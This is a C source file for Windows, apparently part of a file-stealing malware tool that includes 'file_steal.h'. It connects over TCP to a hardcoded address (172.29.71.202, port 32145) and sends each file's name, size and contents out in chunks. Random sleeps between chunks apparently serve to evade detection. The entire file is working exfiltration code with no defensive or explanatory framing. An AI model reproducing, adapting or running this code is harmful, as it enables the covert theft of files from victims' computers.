#include "file_steal.h"

#include <stdio.h>
#include <stdlib.h>
#define CHUNK_SIZE 1024*256

void RandomInterupt() {
    int randomPulse = rand() % 1500;
    Sleep(randomPulse);
}

int ConnectionEstablish(SOCKET *socket, struct sockaddr_in *socket_addr) {
    WSADATA wsadata;
    int connection;
    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
        printf("[!] WinSock initialization failed!");
        return -1;
    }
    int port = 32145;

    socket_addr->sin_family = AF_INET;
    socket_addr->sin_port = htons(port);
    socket_addr->sin_addr.s_addr = inet_addr("172.29.71.202");

    *socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);

    connection = WSAConnect(*socket, (struct sockaddr*) socket_addr, sizeof(struct sockaddr_in), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR) {
        closesocket(*socket);
        WSACleanup();
        return -1;
    }
    return 0;
}

void FileSend(char *path, unsigned long long fileSize, SOCKET socket) {
    FILE *fptr = fopen(path, "rb+");
    char *buffer = (char*)malloc(CHUNK_SIZE);
    char *fileName = strrchr(path, '\\');
    char sendFileName[260] = {0};
    strncpy(sendFileName, fileName + 1, 259);
    printf("%s\n", sendFileName);
    DWORD bytesRead;
    send(socket, sendFileName, 260, 0);
    send(socket, (char*)&fileSize, 8, 0);
    while((bytesRead = fread(buffer, 1, CHUNK_SIZE, fptr)) > 0) {
        RandomInterupt();
        send(socket, buffer, bytesRead, 0);
        RtlZeroMemory(buffer, bytesRead);
    }
    free(buffer);
    fclose(fptr);
}

void ConnectionClose(SOCKET *socket) {
    closesocket(*socket);
    WSACleanup();
}